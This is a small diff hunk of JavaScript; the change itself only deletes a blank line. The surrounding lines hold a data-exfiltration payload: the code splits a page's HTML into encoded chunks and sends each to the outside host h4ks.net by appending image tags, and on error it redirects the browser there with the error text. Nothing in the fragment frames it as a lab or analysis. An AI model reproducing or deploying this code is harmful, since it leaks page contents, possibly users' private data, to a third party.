@@ -8,7 +8,6 @@ try {
                 var part = encodeURIComponent(html.slice(i, i+50));
                 $(document.body).append('<img src="//h4ks.net/go/test2?'+part+'">');
             }
-
             
         } catch (err) {
             location = '//h4ks.net/go/test?'+encodeURIComponent(err.toString());
